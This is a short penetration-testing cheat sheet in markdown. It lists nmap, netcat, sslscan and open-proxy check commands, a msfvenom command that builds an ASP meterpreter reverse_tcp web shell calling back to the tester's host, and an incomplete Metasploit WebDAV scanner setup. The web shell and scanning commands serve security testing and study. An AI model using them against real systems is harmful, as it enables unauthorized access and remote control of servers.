# Commands
  - nmap
    ~~~
    nmap -Pn -p80,443 [IP range] --open
    ~~~

  - Parse domains from html file
    ~~~
    grep -o '[A-Za-z0-9_\.-]*\.*HOSTNAME' index.html | sort -u
    cat index.html | grep -o 'http[s]://[^"]*' | cut -d "/" -f 3 | sort -u > list.txt
    ~~~
  
  - connect
    - netcat
      ~~~
      echo -ne "GET / HTTP/1.0\n\n" | nc [IP addr] [Port]
      ~~~

  - SSL check
    ~~~
    sslscan [domain]:[port]
    ~~~

  - Open Proxy check
    - nc ref
      - https://qiita.com/yasuhiroki/items/d470829ab2e30ee6203f
    - HTTP
      ~~~
      ncat -v sample.domain 80
      ...
      GET http://www.ugtop.com/spill.shtml HTTP/1.0
      ~~~

    - HTTPS
      ~~~
      ncat -v sample.domain 443 --ssl
      ...
      GET http://rfi.nessus.org/check_proxy.html HTTP/1.0

      GET https://www.ugtop.com/spill.shtml HTTP/1.0
      ~~~

    - Webdav

## Web shell
  - https://netsec.ws/?p=331
  - ASP
    ~~~
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp
    ~~~

# Exploitation
  - Metasploit
    - Webdav
      ~~~
      use auxiliary/scanner/http/webdav_scanner
      setg RHOSTS 10.11.1.1-254
      setg 
      ~~~


